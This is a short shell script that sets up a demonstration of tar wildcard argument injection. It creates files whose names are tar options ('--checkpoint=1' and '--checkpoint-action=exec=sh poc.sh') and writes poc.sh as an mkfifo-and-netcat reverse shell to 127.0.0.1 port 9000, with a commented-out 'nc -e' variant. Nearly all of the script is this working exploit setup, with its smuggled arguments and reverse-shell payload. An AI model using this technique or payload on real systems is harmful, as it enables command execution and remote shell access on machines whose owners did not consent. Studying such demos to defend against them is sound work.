#!/usr/bin/sh

printf "\n##### Create wildcard exploit demo #####\n\n"
mkdir demo
cd demo
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh poc.sh"

# Create the reverse shell
# echo 'nc -e /usr/bin/bash 127.0.0.1 9000' > poc.sh
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f' > poc.sh
chmod +x poc.sh
